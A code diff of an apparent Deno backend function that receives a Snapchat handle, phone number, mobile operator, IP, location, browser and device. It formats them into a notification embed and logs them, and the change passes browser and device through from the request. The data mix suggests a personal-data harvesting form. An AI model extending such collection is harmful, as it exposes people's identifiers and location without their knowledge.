@@ -12,17 +12,17 @@ Deno.serve(async (req) => {
 
   const base44 = createClientFromRequest(req);
   const body = await req.json();
-  const { snapchat, telephone, operateur, submissionId, ip, country, city } = body;
+  const { snapchat, telephone, operateur, submissionId, ip, country, city, browser, device } = body;
 
   const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
   const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);
 
-  // Use all data from body parameters (no extraction from headers)
+  // Use all data from body parameters
   const finalIp = ip || "Inconnue";
   const finalCountry = country || "France";
   const finalCity = city || "Inconnue";
-  const browser = "Inconnu";
-  const device = "Inconnu";
+  const finalBrowser = browser || "Inconnu";
+  const finalDevice = device || "Inconnu";
   
   const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
 
@@ -47,8 +47,8 @@ Deno.serve(async (req) => {
       { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
       { name: "🌍 Pays", value: finalCountry, inline: true },
       { name: "🏙️ Ville", value: finalCity, inline: true },
-      { name: "🌐 Navigateur", value: browser, inline: true },
-      { name: "💾 Appareil", value: device, inline: true },
+      { name: "🌐 Navigateur", value: finalBrowser, inline: true },
+      { name: "💾 Appareil", value: finalDevice, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
@@ -70,7 +70,7 @@ Deno.serve(async (req) => {
   await base44.asServiceRole.entities.ActionLog.create({
     submission_id: submissionId,
     action: "submitted",
-    details: { browser, device, ip: finalIp, country: finalCountry, city: finalCity },
+    details: { browser: finalBrowser, device: finalDevice, ip: finalIp, country: finalCountry, city: finalCity },
     timestamp: now.toISOString()
   });
 
